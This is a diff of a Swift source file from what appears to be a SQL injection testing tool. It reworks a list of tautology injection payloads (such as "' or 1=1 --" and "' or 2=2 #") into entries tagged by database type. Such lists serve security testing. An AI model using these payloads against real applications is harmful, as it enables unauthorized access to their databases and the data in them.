@@ -8,23 +8,39 @@
 
 import Foundation
 
+public var theSQLList = SQLi()
+
 public struct SQLi {
     public enum DBType {
-        case mySQL
-        case Oracle
-        case MSSQL
-        case DB2
-        case SyBase
+        case Any
+        case MySQL
+        case Others
     }
     
-    public let listOfSQLi = [
-        " or 1=1 ",
-        " or 1=1 --",
-        " or 1=1 #",
-        "' or 1=1 ",
-        "' or 1=1 --",
-        "' or 1=1 #",
+    public struct SingleSQLi {
+        var typeDB : DBType
+        var value : String
         
+        init(type: DBType, val: String) {
+            typeDB = type
+            value = val
+        }
+    }
+    
+    public let listOfSQLi : [SingleSQLi] = [
+        SingleSQLi(type: .Any, val: "'"),
+        SingleSQLi(type: .Any, val: " or 1=1 "),
+        SingleSQLi(type: .Others, val: " or 1=1 --"),
+        SingleSQLi(type: .MySQL, val: " or 1=1 #"),
+        SingleSQLi(type: .Any, val: "' or 1=1 "),
+        SingleSQLi(type: .Others, val: "' or 1=1 --"),
+        SingleSQLi(type: .MySQL, val: "' or 1=1 #"),
+        SingleSQLi(type: .Any, val: " or 2=2 "),
+        SingleSQLi(type: .Others, val: " or 2=2 --"),
+        SingleSQLi(type: .MySQL, val: " or 2=2 #"),
+        SingleSQLi(type: .Any, val: "' or 2=2 "),
+        SingleSQLi(type: .Others, val: "' or 2=2 --"),
+        SingleSQLi(type: .MySQL, val: "' or 2=2 #")
     ]
     
 }
